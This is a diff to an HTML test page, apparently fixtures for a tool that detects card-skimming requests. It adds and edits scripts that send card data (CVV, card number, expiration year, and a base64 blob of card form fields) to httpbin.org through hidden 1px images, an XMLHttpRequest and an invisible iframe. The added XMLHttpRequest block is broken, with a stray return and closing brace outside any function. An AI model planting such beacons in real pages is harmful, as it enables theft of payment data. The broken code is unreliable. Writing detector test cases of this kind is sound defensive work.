@@ -26,17 +26,17 @@
     var b = document.createElement("img");
     b.width = "1px";
     b.height = "1px";
-    b.id = "hh";
+    b.id = "AA";
     b.src = "https://httpbin.org/get?cvv=323";
     document.body.appendChild(b);
 
     // test GET -> should be blocked (test case)
-    var b = document.createElement("img");
-    b.width = "1px";
-    b.height = "1px";
-    b.id = "hh";
-    b.src = "https://httpbin.org/get?CID=323";
-    document.body.appendChild(b);
+    var http=new XMLHttpRequest();
+      http.open('GET',"https://httpbin.org/get",true);
+      http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+      http.send("CC-NUM=3233424399842344");
+      return http.responseText;
+    }
     
     // test GET -> should not be blocked
     var b = document.createElement("img");
@@ -58,5 +58,8 @@
     b.id = "hh";
     b.src = "https://httpbin.org/get?hash=eyJfX1ZJRVdTVEFURUdFTkVSQVRPUiI6IkRBODhFOTdDIiwiY2tTYW1lQmlsbGluZyI6Im9uIiwiQnV0dG9uMSI6IlN1Ym1pdCIsInR4dENDTW9udGgiOiIxMSIsInR4dENDWWVhciI6IjIwMjEiLCJ0eHRDb3VudHJ5SWQiOiJVUyIsInNoaXBwaW5ndHh0Q291bnRyeUlkIjoiVVMiLCJEYXRlIjoiMTEvMjAyMSIsInR4dENDIjoiNDExMTExMTExMTExMTExMSIsIk51bWJlciI6IjQxMTExMTExMTExMTExMTEiLCJ0eHRTZWN1cml0eSI6IjIxMiIsIkNWViI6IjIxMiIsInR4dEZpcnN0TmFtZSI6IlRlc3QiLCJIb2xkZXIiOiJUZXN0IiwiRG9tYWluIjoid3d3LmhhbGZwcmljZXNvZnQuY29tIn0=";
     document.body.appendChild(b);
+    
+    var t = document.createElement("iframe");
+    t.setAttribute("src", "https://httpbin.org/get?expiration_yr=20"), t.style.display = "none", document.body.appendChild(t)   
   </script>
 </html>
